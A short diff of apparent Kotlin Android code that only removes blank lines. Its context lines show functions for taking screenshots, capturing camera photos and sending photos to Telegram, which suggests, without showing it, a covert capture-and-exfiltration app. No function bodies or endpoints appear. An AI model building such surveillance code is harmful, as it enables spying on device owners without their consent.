@@ -230,23 +230,7 @@ private suspend fun takeScreenshot() {
         file.delete()
     }
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-    
+ 
     private fun takeCameraPhoto(facing: Int) {
         val manager = getSystemService(CAMERA_SERVICE) as CameraManager
         try {
@@ -582,12 +566,6 @@ companion object {
         } catch (e: Exception) {}
     }
 }
-
-
-
-
-
-
 
 
 private suspend fun sendTelegramPhoto(file: File) {
